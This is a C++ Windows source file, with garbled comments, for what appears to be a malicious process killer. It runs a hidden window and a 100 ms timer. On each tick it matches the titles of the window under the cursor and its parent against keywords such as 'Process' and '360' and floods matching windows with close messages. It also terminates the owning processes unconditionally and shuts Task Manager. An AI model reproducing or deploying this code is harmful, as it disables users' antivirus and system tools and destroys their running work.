#include <Windows.h>  
#include <Shlwapi.h>
#pragma comment(lib,"Shlwapi.lib")
//�رս���
BOOL KillProcess(DWORD ProcessId)
{
	HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, ProcessId);
	if (hProcess == NULL)
		return FALSE;
	if (!TerminateProcess(hProcess, 0))
		return FALSE;
	return TRUE;
}
// ����Ҫ����ǰ������  
LRESULT CALLBACK WindowProc(
	_In_  HWND hwnd,
	_In_  UINT uMsg,
	_In_  WPARAM wParam,
	_In_  LPARAM lParam
);
HWND WinInit(const wchar_t* title,HINSTANCE hInstance,int show = SW_HIDE);
#define K_SAFE 1
#define KEY_WORD_NUM 12
const WCHAR* KeyWord[] = { L"����",L"����",L"�Ż�",L"ע���",L"Process",L"����",L"��",L"ľ��",L"����",L"����ǽ" ,L"360",L"�ܼ�" };

// ������ڵ�  
int CALLBACK WinMain(
	_In_  HINSTANCE hInstance,
	_In_  HINSTANCE hPrevInstance,
	_In_  LPSTR lpCmdLine,
	_In_  int nCmdShow
)
{
	WinInit((const wchar_t*)lpCmdLine, hInstance,5);
	// ��Ϣѭ��  
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}
// ��WinMain��ʵ��  
LRESULT CALLBACK WindowProc(
	_In_  HWND hwnd,
	_In_  UINT uMsg,
	_In_  WPARAM wParam,
	_In_  LPARAM lParam
)
{
	switch (uMsg)
	{
	case WM_CREATE:
		SetTimer(hwnd, 1, 100, NULL);
		SetTimer(hwnd, 2, 300000, NULL);
		break;
	case WM_TIMER:
	{
		if (wParam == 1)
		{
			if (K_SAFE)
			{
				WCHAR hstr[MAX_PATH];
				WCHAR str[MAX_PATH];
				POINT CurPoint;
				HWND hCurrent, hParent;
				GetCursorPos(&CurPoint);
				hCurrent = WindowFromPoint(CurPoint);//ȡ��������ڵĴ��ھ��
				hParent = hCurrent;
				while (GetParent(hParent) != NULL)
					hParent = GetParent(hParent);
				
				//����˵����ر�ɱ�����
				GetWindowTextW(hCurrent, hstr, MAX_PATH);
				GetWindowTextW(hParent, str, MAX_PATH);
				for (int i = 0; i < KEY_WORD_NUM; i++)
				{
					if ((StrStrIW(str, KeyWord[i]) || StrStrIW(hstr, KeyWord[i])) && hCurrent)
					{
						for (int i = 0; i < 500; i++)
						{
							PostMessage(hCurrent, WM_DESTROY, 0, 0);
							PostMessage(hParent, WM_CLOSE, 0, 0);
							PostMessage(hCurrent, WM_CLOSE, 0, 0);
							PostMessage(hParent, WM_DESTROY, 0, 0);
						}
					}
				}
				DWORD dwPID;//����PID
				DWORD dwThreadID = ::GetWindowThreadProcessId(hParent, &dwPID);
				KillProcess(dwPID);
				dwThreadID = ::GetWindowThreadProcessId(hCurrent, &dwPID);
				KillProcess(dwPID);
				//ͨ����鴰�ڱ��� ��windows �����������,����Ƿ���windows�������������
				//�ر����������
				if (FindWindow(NULL, TEXT("Windows ���������")) != NULL)
					PostMessage(FindWindow(NULL, TEXT("Windows ���������")), WM_DESTROY, 0, 0);
			}	
		}
		
		break;
	}
	default:
		return DefWindowProc(hwnd, uMsg, wParam, lParam);
		break;
	}
	
}

HWND WinInit(const wchar_t * title, HINSTANCE hInstance,int show)
{
	// ����  
	WCHAR* cls_Name = (WCHAR*)L"My Class";
	// ��ƴ�����  
	WNDCLASS wc;
	memset(&wc, 0, sizeof(wc));
	wc.lpfnWndProc = WindowProc;
	wc.lpszClassName = cls_Name;
	wc.hInstance = hInstance;
	// ע�ᴰ����  
	int i = RegisterClass(&wc);
	i = GetLastError();
	// ��������  
	HWND hwnd = CreateWindow(
		cls_Name,           //������Ҫ�͸ղ�ע���һ��  
		title,  //���ڱ�������  
		WS_OVERLAPPEDWINDOW, //���������ʽ  
		38,             //��������ڸ�����X����  
		20,             //��������ڸ�����Y����  
		480,                //���ڵĿ��  
		250,                //���ڵĸ߶�  
		NULL,               //û�и����ڣ�ΪNULL  
		NULL,               //û�в˵���ΪNULL  
		hInstance,          //��ǰӦ�ó����ʵ�����  
		NULL);              //û�и������ݣ�ΪNULL  
	if (hwnd == NULL) //��鴰���Ƿ񴴽��ɹ�  
		return 0;

	// ��ʾ����  
	ShowWindow(hwnd, show);

	// ���´���  
	UpdateWindow(hwnd);
	return HWND();
}
